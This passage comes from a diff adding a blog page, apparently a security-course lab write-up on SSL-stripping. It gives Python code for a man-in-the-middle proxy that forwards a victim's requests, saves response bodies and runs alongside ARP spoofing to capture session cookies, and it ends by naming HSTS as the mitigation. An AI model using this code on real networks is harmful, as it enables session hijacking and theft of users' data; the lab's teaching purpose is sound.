+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">filepath</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">filepath</span> <span class="o">=</span> <span class="n">filepath</span>
+            <span class="nb">super</span><span class="p">().</span><span class="n">__init__</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>and specify how each of <code class="language-plaintext highlighter-rouge">GET</code>, <code class="language-plaintext highlighter-rouge">POST</code>, and <code class="language-plaintext highlighter-rouge">PUT</code> should be handled.
+Recall we want to hijack the session so we intercept the <code class="language-plaintext highlighter-rouge">301</code> redirect
+and establish our own connection with the server forwarding the information
+so the session appears legitimate to Alice.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># GET request handler 
+</span>    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="s">""</span>
+        <span class="n">method</span> <span class="o">=</span> <span class="s">'GET'</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">path</span>
+
+        <span class="n">body_length</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'content-length'</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">body_length</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">body_length</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)):</span>
+            <span class="c1"># read in the body
+</span>            <span class="n">body</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">body_length</span><span class="p">))</span>
+
+        <span class="n">headers</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">items</span><span class="p">()</span>
+        <span class="n">headers_dict</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">headers</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"headers"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">headers_dict</span><span class="p">)</span>
+
+        <span class="n">conn</span> <span class="o">=</span> <span class="n">HTTPSConnection</span><span class="p">(</span><span class="n">SERVER</span><span class="p">)</span>
+        <span class="n">conn</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="n">method</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">headers_dict</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">getresponse</span><span class="p">()</span>
+
+        <span class="n">res_body</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+        <span class="n">res_status</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">status</span>
+        <span class="n">res_headers</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">getheaders</span><span class="p">()</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">path</span> <span class="o">==</span> <span class="s">"/check"</span><span class="p">):</span>
+            <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">filepath</span><span class="p">,</span><span class="s">"w+"</span><span class="p">)</span>
+            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">res_body</span><span class="p">)</span>
+            <span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+        <span class="c1"># self.wfile.write(res_body.decode('utf-8'))
+</span>        <span class="c1"># HTTP response headers
+</span>        <span class="c1"># self.send_header("Content-type", "text/html")
+</span>        <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="n">res_status</span><span class="p">,</span> <span class="n">res_body</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"response"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"headers"</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">pair</span> <span class="ow">in</span> <span class="n">res_headers</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">pair</span><span class="p">)</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="n">pair</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">pair</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="c1">#.split(";")[0])
+</span>        <span class="c1"># self.send_header("Content-type", "text/html")
+</span>        <span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res_status</span><span class="p">)</span> <span class="o">+</span> <span class="s">" ; "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">reason</span><span class="p">))</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">res_body</span><span class="p">)</span>
+        <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Something to notice here is that we are targetting a page Alice visits.
+If the path is <code class="language-plaintext highlighter-rouge">'/check'</code> Mallory saves the response body violating
+the confidentiality Alice may think she has.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># POST request handler 
+</span>    <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="s">""</span>
+        <span class="n">method</span> <span class="o">=</span> <span class="s">'POST'</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">path</span>
+        <span class="n">body_length</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'content-length'</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">body_length</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">body_length</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)):</span>
+            <span class="c1"># read in the body
+</span>            <span class="n">body</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">body_length</span><span class="p">))</span>
+
+        <span class="n">headers</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">items</span><span class="p">()</span>
+        <span class="n">headers_dict</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">headers</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"headers"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">headers_dict</span><span class="p">)</span>
+
+        <span class="n">conn</span> <span class="o">=</span> <span class="n">HTTPSConnection</span><span class="p">(</span><span class="n">SERVER</span><span class="p">)</span>
+        <span class="n">conn</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="n">method</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">headers_dict</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">getresponse</span><span class="p">()</span>
+
+        <span class="n">res_body</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+        <span class="n">res_status</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">status</span>
+        <span class="n">res_headers</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">getheaders</span><span class="p">()</span>
+
+        <span class="c1"># self.wfile.write(res_body.decode('utf-8'))
+</span>        <span class="c1"># HTTP response headers
+</span>        <span class="c1"># self.send_header("Content-type", "text/html")
+</span>        <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="n">res_status</span><span class="p">,</span> <span class="n">res_body</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"response"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"headers"</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">pair</span> <span class="ow">in</span> <span class="n">res_headers</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">pair</span><span class="p">)</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="n">pair</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">pair</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="c1">#.split(";")[0])
+</span>        <span class="c1"># self.send_header("Content-type", "text/html")
+</span>        <span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res_status</span><span class="p">)</span> <span class="o">+</span> <span class="s">" ; "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">reason</span><span class="p">))</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">res_body</span><span class="p">)</span>
+        <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># PUT request handler     
+</span>    <span class="k">def</span> <span class="nf">do_PUT</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="s">""</span>
+        <span class="n">method</span> <span class="o">=</span> <span class="s">'PUT'</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">path</span>
+        <span class="n">body_length</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'content-length'</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">body_length</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">body_length</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)):</span>
+            <span class="c1"># read in the body
+</span>            <span class="n">body</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">body_length</span><span class="p">))</span>
+
+        <span class="n">headers</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">items</span><span class="p">()</span>
+        <span class="n">headers_dict</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">headers</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"headers"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">headers_dict</span><span class="p">)</span>
+
+        <span class="n">conn</span> <span class="o">=</span> <span class="n">HTTPSConnection</span><span class="p">(</span><span class="n">SERVER</span><span class="p">)</span>
+        <span class="n">conn</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="n">method</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">headers_dict</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">getresponse</span><span class="p">()</span>
+
+        <span class="n">res_body</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+        <span class="n">res_status</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">status</span>
+        <span class="n">res_headers</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">getheaders</span><span class="p">()</span>
+
+        <span class="c1"># self.wfile.write(res_body.decode('utf-8'))
+</span>        <span class="c1"># HTTP response headers
+</span>        <span class="c1"># self.send_header("Content-type", "text/html")
+</span>        <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="n">res_status</span><span class="p">,</span> <span class="n">res_body</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"response"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"headers"</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">pair</span> <span class="ow">in</span> <span class="n">res_headers</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">pair</span><span class="p">)</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="n">pair</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">pair</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="c1">#.split(";")[0])
+</span>        <span class="c1"># self.send_header("Content-type", "text/html")
+</span>        <span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res_status</span><span class="p">)</span> <span class="o">+</span> <span class="s">" ; "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">reason</span><span class="p">))</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">res_body</span><span class="p">)</span>
+        <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>And the driver for the server</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">run_server</span><span class="p">(</span><span class="n">filepath</span><span class="p">):</span>
+    <span class="n">handler</span> <span class="o">=</span> <span class="n">partial</span><span class="p">(</span><span class="n">Server</span><span class="p">,</span> <span class="n">filepath</span><span class="p">)</span>
+    <span class="n">httpd</span> <span class="o">=</span> <span class="n">HTTPServer</span><span class="p">((</span><span class="s">''</span><span class="p">,</span> <span class="mi">8080</span><span class="p">),</span> <span class="n">handler</span><span class="p">)</span>
+    <span class="n">httpd</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="putting-it-all-together">Putting it All Together</h2>
+
+<hr />
+
+<p>We’ve written all we need to go through with the attack so
+back in our main script, we write the driver.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">filepath</span><span class="p">):</span>
+    <span class="n">init</span><span class="p">()</span>
+    <span class="n">arp_process</span> <span class="o">=</span> <span class="n">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">arp_spoof</span><span class="p">)</span>
+    <span class="n">stripping_process</span> <span class="o">=</span> <span class="n">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">ssl_stripping</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">filepath</span><span class="p">,))</span>
+    <span class="n">arp_process</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">stripping_process</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">stripping_process</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>
+    <span class="n">arp_process</span><span class="p">.</span><span class="n">terminate</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Where the last step in our driver is to call our custom ssl-stripping function</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">ssl_stripping</span><span class="p">(</span><span class="n">filepath</span><span class="p">):</span>
+    <span class="n">run_server</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We running the attack script as Mallory we see Alice now prints</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[http] GET response received
+[http] POST response received
+[http] PUT response received
+</code></pre></div></div>
+
+<p>And Mallory got a hold of Alice’s session cookie and content body.</p>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="conclusion">Conclusion</h2>
+
+<hr />
+
+<p>We demonstrated how a malicious actor can perform SSL-stripping when on the same local network but
+this attack can also be performed on a wider network. It is an example of a <a href="https://en.wikipedia.org/wiki/Downgrade_attack">downgrade attack</a>
+and can be mitigated using the HTTP Strict Transport Security header (HSTS).</p>
+
+<p>When you’re done, don’t forget to <a href="/crypto/2020/10/08/05-lab.html#docker-cleanup">clean up</a>
+after Docker.</p>
+
+<hr />
+
+<h3 id="credits">Credits</h3>
+
+<hr />
+
+<p>These labs and exercises were provided as a part of a course in Security
+taught in 2019 by
+<a href="https://thierrysans.me/">Thierry Sans</a>.
+Credit for creation of these exercises and
+Docker images/containers goes to their respective creators.</p>
+
+<p>Docker images, urls, etc. are kept private
+to prevent abuse but if interested please
+contact.</p>
+
+
+  </div>
+</article>
+
+
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
